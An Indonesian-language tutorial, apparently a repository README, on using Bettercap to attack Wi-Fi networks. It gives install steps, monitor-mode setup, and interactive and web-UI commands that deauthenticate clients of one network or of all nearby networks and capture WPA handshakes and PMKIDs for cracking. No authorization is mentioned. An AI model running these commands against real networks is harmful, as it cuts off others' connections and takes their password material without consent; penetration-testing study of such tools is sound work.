# Bettercap

[Bettercap](https://www.bettercap.org/) adalah perangkat lunak kerangka kerja keamanan yang kuat, mudah diperluas, dan portabel, ditulis menggunakan bahasa `Go`. Perangkat ini dirancang sebagai alat terpadu yang mudah digunakan bagi peneliti keamanan, tim pengujian penetrasi (red team), dan spesialis reverse engineering. Fitur-fiturnya memungkinkan pengumpulan informasi serta pengujian dan eksploitasi keamanan pada jaringan Wi-Fi, perangkat Bluetooth Low Energy (BLE), perangkat Human Interface Device (HID) nirkabel, jaringan CAN-bus, serta jaringan IPv4 dan IPv6.

## Instalasi

Kali Linux:

1. Pake packet manager (`apt`):

```
sudo apt-get update
sudo apt-get install bettercap bettercap-dbgsym bettercap-caplets bettercap-ui
bettercap -version
```

2. Pake Go:

```
sudo apt-get update
sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
go install github.com/bettercap/bettercap/v2@latest
sudo mv ~/go/bin/bettercap /usr/local/bin/
bettercap -version
```

Untuk informasi lebih lengkapnya lagi bisa lihat di sini: [https://www.bettercap.org/project/installation/](https://www.bettercap.org/project/installation/)

## Penggunaan

Sebelum menggunakan bettercap, kita harus mengaktifkan mode monitor dulu pake:

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

### 1. Mode Interaktif

```
sudo bettercap
```

> Kalo muncul output error kaya gini `No active interfaces found.`. Pake opsi `-iface [interface]`.

#### Capture Handshake

Single target:

```
set wifi.handshakes.file [output_file]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth [bssid]
```

Semua target:

```
set wifi.handshakes.file [output_dir]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
set wifi.assoc.skip *
wifi.deauth *
```

#### Capture PMKID

Single target:

```
set wifi.handshakes.file [output_file]
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

Semua target:

```
set wifi.handshakes.file [output_dir]
set wifi.handshakes.aggregate false
wifi.recon on
set ticker.commands "clear; wifi.show"
ticker on
ticker off
wifi.assoc *
```

### 2. Opsi Caplet

```
sudo bettercap -caplet [file_caplet]
```

> Kalo muncul output error kaya gini `No active interfaces found.`. Pake opsi `-iface [interface]`.

Contoh file capletnya ada di sini: [https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/caplet.cap)

### 3. Mode WEB UI

```
sudo bettercap -eval "ui on"
```

1. Arahkan kursor ke link yang ada di bagian web ui starting on, yaitu `http://127.0.0.1:80`, terus klik kanan dan pilih `Open Link`.

   ![img 1](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%201.png)
2. Masukkan kredensial login:
   - Usermame: `user`
   - Password: `pass`

   ![img 2](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%202.png)
3. Klik ikon Wi-Fi:

   ![img 3](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%203.png)
4. Pilih interface yang ingin dipake dengan klik menu dropdown:


   ![img 4](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%204.png)
5. Lakukan scanning Wi-Fi dengan klik ikon play:

   ![img 5](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%205.png)
6. Di gambar ini ada beberapa bagian, antara lain:

   ![img 6](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%206.png)

   - `RSSI`: Kekuatan sinyal dari Access Point (AP) dalam satuan dBm.
   - `ESSID`: Nama jaringan Wi-Fi.
   - `BSSID`: Alamat MAC unik dari Access Point.
   - `Vendor`: Produsen perangkat Access Point berdasarkan BSSID.
   - `Encryption`: Jenis enkripsi yang digunakan oleh jaringan Wi-Fi.
   - `Ch`: Kanal (channel) yang digunakan oleh Access Point.
   - `Clients`: Jumlah perangkat klien yang saat ini terhubung ke AP tersebut.
   - `Sent`: Jumlah paket data yang dikirim dari perangkat ke AP.
   - `Recvd`: Jumlah paket data yang diterima dari AP oleh perangkat.
   - `Seent`: Menunjukkan jumlah paket yang terdeteksi (seen) dari klien atau AP yang dipantau.
8. Di sini, kita harus memilih BSSID target yang ingin diserang, lalu klik menu dropdownnya:

   ![img 7](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%207.png)
9. Di sini, kita dapat melakukan dua jenis serangan, antara lain:
   - Capture Handshake
   - Capture PMKID
  
   ![img 8](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%208.png)

   Untuk Capture Handshake, klik `Deauthenticate Client`. Untuk Capture PMKID, klik `Associate`. Dalam panduan ini, kita akan memilih `Capture Handshake`.
   
   > Catatan:
   >
   > - Capture Handshake: Memerlukan setidaknya 1 klien yang aktif.
   > - Capture PMKID: Tidak semua router mendukung PMKID.
10. Setelah klik `Deauthenticate Client`, tunggu sampe handshake berhasil capture. Handshake dianggap berhasil capture kalo muncul ikon `kunci merah` pada bagian `Encryption` dan notifikasi `Captured handshake for station...`:

    ![img 9](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%209.png)
    
11. Klik ikon Events:

    ![img 10](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%2010.png)
12. Klik salah satu dari ketiga item di bagian pesan:

    ![img 11](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%2011.png)
13. Dari gambar di bawah ini kelihatan kalo file handshake disimpan di: `/root/bettercap-wifi-handshakes.pcap`.

    ![img 12](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/bettercap/img/ui%2012.png)
